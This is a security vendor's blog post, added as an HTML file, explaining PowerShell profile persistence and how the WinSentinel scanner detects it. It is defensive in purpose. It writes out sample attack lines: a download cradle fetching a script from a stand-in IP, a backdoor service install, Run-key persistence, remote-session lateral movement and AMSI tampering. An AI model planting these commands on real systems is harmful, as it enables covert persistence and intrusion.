@@ -1,0 +1,158 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PowerShell Profile Persistence: The Startup Script Attackers Love — WinSentinel Blog</title>
+  <meta name="description" content="How profile.ps1 becomes a stealthy backdoor, and what WinSentinel flags when it scans yours." />
+  <meta name="theme-color" content="#0b0f17" />
+  <meta name="author" content="Saurav Bhattacharya" />
+  <meta property="og:title" content="PowerShell Profile Persistence: The Startup Script Attackers Love" />
+  <meta property="og:description" content="How profile.ps1 becomes a stealthy backdoor, and what WinSentinel flags when it scans yours." />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2026-08-14" />
+  <meta property="og:url" content="https://winsentinel.ai/blog/powershell-profile-persistence-the-startup-script-attackers-" />
+  <meta property="og:image" content="https://winsentinel.ai/og/blog-powershell-profile-persistence-the-startup-script-attackers-.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://winsentinel.ai/og/blog-powershell-profile-persistence-the-startup-script-attackers-.png" />
+  <meta name="twitter:title" content="PowerShell Profile Persistence: The Startup Script Attackers Love" />
+  <meta name="twitter:description" content="How profile.ps1 becomes a stealthy backdoor, and what WinSentinel flags when it scans yours." />
+  <link rel="canonical" href="https://winsentinel.ai/blog/powershell-profile-persistence-the-startup-script-attackers-" />
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cpath fill='%2338bdf8' d='M32 4 8 14v18c0 14 10 24 24 28 14-4 24-14 24-28V14L32 4Z'/%3E%3Cpath fill='%230b0f17' d='m28 38-7-7 3-3 4 4 11-11 3 3-14 14Z'/%3E%3C/svg%3E" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            mono: ['ui-monospace','SFMono-Regular','Menlo','Monaco','Consolas','monospace'],
+            sans: ['Inter','ui-sans-serif','system-ui','-apple-system','Segoe UI','Roboto','sans-serif'],
+          },
+          colors: {
+            ink: { 950: '#070a11', 900: '#0b0f17', 800: '#11161f', 700: '#1a2030' },
+          },
+        },
+      },
+    };
+  </script>
+  <style>
+    html { scroll-behavior: smooth; }
+    body { background: radial-gradient(1200px 600px at 50% -200px, #0e1a2d 0%, #070a11 60%, #070a11 100%); }
+    .prose h2 { color: #fff; font-size: 1.5rem; font-weight: 700; margin-top: 2rem; margin-bottom: 0.75rem; }
+    .prose h3 { color: #e2e8f0; font-size: 1.125rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
+    .prose p { color: #cbd5e1; line-height: 1.75; margin-bottom: 1rem; }
+    .prose code { color: #7dd3fc; background: rgba(56,189,248,.08); padding: 2px 6px; border-radius: 4px; font-size: 0.875em; }
+    .prose pre { background: #11161f; border: 1px solid rgba(255,255,255,.08); border-radius: 8px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
+    .prose pre code { background: none; padding: 0; color: #e2e8f0; }
+    .prose ul { list-style: disc; padding-left: 1.5rem; color: #cbd5e1; margin-bottom: 1rem; }
+    .prose li { margin-bottom: 0.25rem; }
+    .prose a { color: #38bdf8; text-decoration: underline; text-underline-offset: 2px; }
+    .prose a:hover { color: #7dd3fc; }
+    .prose blockquote { border-left: 3px solid #38bdf8; padding-left: 1rem; color: #94a3b8; font-style: italic; margin: 1rem 0; }
+  </style>
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "@id": "https://winsentinel.ai/blog/powershell-profile-persistence-the-startup-script-attackers-",
+  "headline": "PowerShell Profile Persistence: The Startup Script Attackers Love",
+  "datePublished": "2026-08-14",
+  "dateModified": "2026-08-14",
+  "url": "https://winsentinel.ai/blog/powershell-profile-persistence-the-startup-script-attackers-",
+  "mainEntityOfPage": "https://winsentinel.ai/blog/powershell-profile-persistence-the-startup-script-attackers-",
+  "description": "How profile.ps1 becomes a stealthy backdoor, and what WinSentinel flags when it scans yours.",
+  "author": {
+    "@type": "Person",
+    "name": "Saurav Bhattacharya"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "WinSentinel",
+    "url": "https://winsentinel.ai",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://winsentinel.ai/og/default.svg"
+    }
+  },
+  "image": "https://winsentinel.ai/og/blog-powershell-profile-persistence-the-startup-script-attackers-.png",
+  "isPartOf": {
+    "@type": "Blog",
+    "@id": "https://winsentinel.ai/blog",
+    "name": "WinSentinel Blog"
+  }
+}
+  </script>
+<!-- Cloudflare Web Analytics (cookieless). Token is set out-of-band; loader no-ops until configured. -->
+<script>window.__WS_CF_BEACON_TOKEN__ = "__CF_BEACON_TOKEN__";</script>
+<script defer src="/js/cf-analytics.js"></script>
+</head>
+<body class="font-sans text-slate-200 antialiased">
+
+<div id="site-header"></div>
+
+<article class="max-w-3xl mx-auto px-6 pt-14 pb-20">
+  <a href="/blog" class="text-sm text-sky-400 hover:text-sky-300">← All posts</a>
+  <time class="mt-8 block text-xs text-slate-500 uppercase tracking-wider">August 14, 2026</time>
+  <h1 class="mt-2 text-3xl md:text-4xl font-bold text-white leading-tight">PowerShell Profile Persistence: The Startup Script Attackers Love</h1>
+  <p class="mt-4 text-lg text-slate-300">How profile.ps1 becomes a stealthy backdoor, and what WinSentinel flags when it scans yours.</p>
+
+  <div class="prose mt-8">
+    <p>Every time you open a PowerShell window, PowerShell quietly runs a handful of script files first — your <em>profiles</em>. They exist so you can set aliases, tweak your prompt, and load modules automatically. They also happen to be one of the cleanest persistence mechanisms on Windows: a line an attacker drops into a profile runs, silently, on <strong>every single shell launch</strong>, with the privileges of whoever opened it. MITRE tracks this as <a href="https://attack.mitre.org/techniques/T1546/013/">T1546.013 — Event Triggered Execution: PowerShell Profile</a>.</p>
+
+    <h2>Where the profiles live</h2>
+    <p>There are four profile scopes, and they exist twice — once for Windows PowerShell 5.x and once for PowerShell 7+ (<code>pwsh</code>). The two that matter most for defenders are:</p>
+    <ul>
+      <li><strong>CurrentUser</strong> profiles under your Documents folder — run when <em>you</em> open a shell.</li>
+      <li><strong>AllUsers</strong> profiles under <code>$PSHOME</code> (e.g. <code>C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1</code>) — run for <em>every user on the machine</em>. A malicious line here is effectively a machine-wide backdoor.</li>
+    </ul>
+    <p>You can see the four paths for your current host at any time:</p>
+    <pre><code>$PROFILE | Select-Object *</code></pre>
+    <p>Most machines have no profile files at all, which is exactly why a newly-appeared one is worth a second look.</p>
+
+    <h2>What a weaponized profile looks like</h2>
+    <p>The trick with profile persistence is that the payload usually isn't <em>in</em> the profile — the profile just fetches and runs it. A one-line download cradle is the classic:</p>
+    <pre><code># profile.ps1 — one line is all it takes
+IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')</code></pre>
+    <p>But a profile can also do the persistence <em>itself</em>, without ever touching the network again after the first run. A few patterns we see repeatedly:</p>
+    <ul>
+      <li><strong>Service install</strong> — <code>sc create backdoor binPath= C:\evil.exe start= auto</code> or <code>New-Service</code>, so a payload survives as a SYSTEM service (T1543.003).</li>
+      <li><strong>Run-key persistence</strong> — <code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run …</code>, so the payload relaunches at every logon (T1547.001).</li>
+      <li><strong>Lateral movement</strong> — an <code>Enter-PSSession -ComputerName dc01</code> or <code>Invoke-Command -ComputerName …</code> staged from a profile turns an interactive login into a jump box (T1021.006).</li>
+      <li><strong>AMSI / logging tampering</strong> — flipping <code>amsiInitFailed</code> or disabling script-block logging so the <em>rest</em> of the session runs blind.</li>
+    </ul>
+    <blockquote>The nastiest part: a profile that only <em>configures</em> other persistence looks almost benign in isolation. There's no beaconing to catch, no dropped binary in a temp folder — just a text file that happens to run at every prompt.</blockquote>
+
+    <h2>Why this slips past people</h2>
+    <p>Profiles are a legitimate feature, so they don't set off most tooling. They're plain text in a user-writable location, so no elevation is needed to plant one in a CurrentUser scope. And because admins <em>expect</em> profiles to contain automation, a hostile line blends into the noise of prompt tweaks and module imports. The detection problem isn't "is there a profile?" — it's "does this profile do something a login script has no business doing?"</p>
+
+    <h2>How WinSentinel audits your profiles</h2>
+    <p>WinSentinel's <strong>PowerShell Security</strong> module reads every profile that exists on the machine — all four scopes, for both Windows PowerShell and PowerShell 7 — and scans the contents against a library of high-signal indicators: download cradles, base64-encoded commands, in-memory .NET loading, AMSI and Defender tampering, credential-dumping tooling, and — as of this week's build — service-install and Run-key persistence and interactive remote-session lateral movement. Each match is reported with a plain-English reason and the MITRE technique it maps to.</p>
+    <p>Two grading rules keep it honest:</p>
+    <ul>
+      <li>A hit in a <strong>machine-wide</strong> (<code>AllUsers</code>) profile is graded <em>Critical</em> — it runs for everyone.</li>
+      <li>Benign look-alikes (a read-only <code>Get-Service</code>, a comment mentioning a firewall, a <code>Get-ItemProperty</code> on a registry path) are deliberately <em>not</em> flagged, so the finding stays actionable instead of drowning you in noise.</li>
+    </ul>
+    <p>Run it locally — no account, no fleet, no upload:</p>
+    <pre><code>dotnet tool install --global WinSentinel.Cli
+winsentinel --audit --category PowerShell</code></pre>
+    <p>All of this is in the free, single-machine tier. Point it at your own box, read the profile findings, and decide whether that clever prompt tweak you inherited three jobs ago is actually a clever prompt tweak.</p>
+
+    <h2>Cleaning up</h2>
+    <p>If you find a profile you can't account for, don't just delete it — capture it first (it's evidence), then check the three places it may have already seeded: scheduled tasks, the <code>Run</code>/<code>RunOnce</code> keys, and installed services. Profile persistence is rarely the whole story; it's usually the loader for something quieter.</p>
+
+    <p class="mt-8"><a href="/blog">← Back to all posts</a> · <a href="/modules">Browse every audit module →</a></p>
+  </div>
+
+  <nav class="mt-16 pt-8 border-t border-white/10 flex items-center justify-between gap-6 text-sm text-slate-400">
+    <a href="/blog/fleet-policy-enforcement" class="hover:text-white">← Fleet Policy Enforcement: Setting a Security Bar and Finding the Nodes That Fail It</a>
+    <a href="/blog/auditing-windows-hello-for-business-passwordless-posture-don" class="hover:text-white text-right">Auditing Windows Hello for Business: Passwordless Posture Done Right →</a>
+  </nav>
+</article>
+
+<div id="site-footer"></div>
+<script src="/components/nav.js"></script>
+</body>
+</html>
